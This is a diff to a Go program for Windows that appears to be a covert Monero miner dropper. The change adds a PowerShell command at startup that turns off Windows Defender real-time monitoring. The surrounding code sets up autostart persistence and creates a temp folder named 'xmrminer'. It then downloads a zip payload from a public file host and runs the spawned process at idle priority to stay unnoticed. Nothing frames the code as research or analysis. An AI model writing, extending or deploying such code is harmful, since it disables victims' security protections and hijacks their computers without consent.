@@ -9,13 +9,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	"path/filepath"
 	"strings"
 	"syscall"
+
 	"golang.org/x/sys/windows"
-	"os/user"
-	"time"
-// 	"os/signal"
 )
 
 const (
@@ -130,11 +129,6 @@ func startCommand(dir string) {
 		log.Println("Error getting process handle:", err)
 	}
 
-//	err := syscall.Setpriority(syscall.PRIO_PROCESS, cmd.Process.Pid, 10)
-//	if err != nil {
-//		log.Println("Error setting process priority:", err)
-//	}
-
 	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
 	if err != nil {
 		log.Println("Error setting process priority:", err)
@@ -223,7 +217,8 @@ func autostart() {
 }
 
 func main() {
-	time.Sleep(time.Minute)
+	cmd := exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true")
+	cmd.Run()
 
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
 	if err != nil {
@@ -232,19 +227,6 @@ func main() {
 	defer f.Close()
 	log.SetOutput(f)
 
-//	currentUser, err := user.Current()
-//	if err != nil {
-//		log.Fatalf(err.Error())
-//	}
-//	homedir := currentUser.HomeDir
-
-//	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
-//	err = copy(os.Args[0], startup)
-//	if err != nil {
-//		log.Panicf("copy -> %v", err)
-//	}
-//	log.Printf("NOTERROR startup string is: %s", startup)
-
 	autostart()
 
 	dir, err := ioutil.TempDir("", "xmrminer")
@@ -252,17 +234,6 @@ func main() {
 		log.Fatal(err)
 	}
 	defer os.RemoveAll(dir)
-
-//	sigs := make(chan os.Signal, 1)
-//	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
-//	go func() {
-//  		<- sigs
-//  		err := RemoveContents(filepath.Join("tmp", "xmrcache"))
-//  		if err != nil {
-//  			log.Fatal(err)
-//  		}
-//  		os.Exit(0)
-//	}()
 
 	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/52ea29.zip")
 	if err != nil {
